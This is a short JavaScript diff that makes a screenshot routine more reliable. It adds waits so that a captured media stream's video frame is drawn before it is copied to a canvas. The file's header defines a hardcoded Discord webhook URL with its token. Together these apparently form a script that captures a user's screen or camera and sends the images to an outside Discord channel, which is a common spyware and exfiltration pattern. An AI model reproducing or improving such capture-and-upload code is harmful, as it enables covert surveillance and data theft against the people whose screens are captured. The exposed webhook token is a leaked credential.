@@ -26,13 +26,19 @@ const WEBHOOK="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE
     // setup video element
     const video = document.createElement("video");
     video.srcObject = stream;
+
     await new Promise(resolve=>{
       video.onloadedmetadata = ()=> video.play().then(resolve);
     });
+
+    // wait until video has valid width/height
     await new Promise(resolve=>{
       const check=()=>{if(video.videoWidth && video.videoHeight) resolve(); else setTimeout(check,50);}
       check();
     });
+
+    // wait a bit more so the frame is actually drawn
+    await new Promise(r => setTimeout(r, 500));
 
     // capture screenshot
     const canvas = document.createElement("canvas");
